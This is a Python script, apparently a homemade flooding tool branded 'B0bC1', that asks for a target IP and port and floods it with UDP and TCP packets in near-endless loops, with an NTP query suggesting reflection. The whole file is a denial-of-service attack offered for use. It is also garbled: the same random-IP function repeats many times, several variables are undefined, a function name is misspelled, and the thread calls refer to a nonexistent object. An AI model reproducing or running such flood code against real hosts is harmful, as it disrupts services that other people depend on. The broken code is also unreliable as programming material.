#!/usr/bin/env python3
import socket
import threading
import os
import time
import pyfiglet
import os
os.system("clear")
os.system("pyfiglet --color=WHITE B0bC1")
import socket, threading
IP = input("IP: ")
PORT = int(input("PORTA: "))
print("...")
time.sleep(1.3)
print("Down:)")
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
import socket, threading
data = bytes.fromhex("AA AA AA")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((IP, PORT))
for i in range(0, 9999999999999):
    s.send(data)
s.close()
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
#!/usr/bin/env python3
import socket, threading, random
def run():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for i in range(999999999999999999999999999999999999):
				s.sendto(data,addr)
			print("")
		except:
			print("")
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
#!/usr/bin/env python3
import socket, threading, random
def run2():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			addr = (str(IP),int(PORT))
			s.send(data)
			for i in range(999999999999999999999999999999999999999999999999999999999999999):
				s.send(data)
			print("")
		except:
			s.close()
			print("")
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
import socket, threading
n = 0
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
def ataque():
    global n, s
    while True:
        s.sendto(bytes(str(n),'utf-8'),(IP, PORT))
        n+=1
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
import socket, threading
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_socket.sendto(b"UDP UDP UDP", (IP, PORT))
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
import socket, threading, time, sys
def news():
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < Timeout:
            PORT = random.randit(22,55500)
            sock.sendto(bytes*random.randint(5,22),(IP, PORT))
    except:
        print("")
import random
def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip
import socket, time
ntp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ntp_query = b"\x1b" + b"\x00" * 47
ntp_socket.sendto(ntp_query, (IP, PORT))
ntp_response, _ = ntp_socket.recvfrom(1024)
print("NTP response:", ntp_response)
ntp_socket.close()
threading.Thread(target=ataque, args=()).start()
threading.Thread(target = data)
th.start()
threading.Thread(target = IP)
th.start()
threading.Thread(target = run)
th.start()
threading.Thread(target = run2)
th.start()
threading.Thread(target = news)
th.start()
threading.Thread(target = randomip)
th.start()
def new():
	threading.Thread(target = data)
	th.start()
	threading.Thread(target = run)
	th.start()
	threading.Thread(target = run2)
	th.start()
	threading.Thread(target=ataque, args=()).start()
threading.Thread(target = IP)
th.start()
threading.Thread(target = news)
th.start()
threading.Thread(target = randomip)
th.start()
threading.Thread(target = new)
th.start()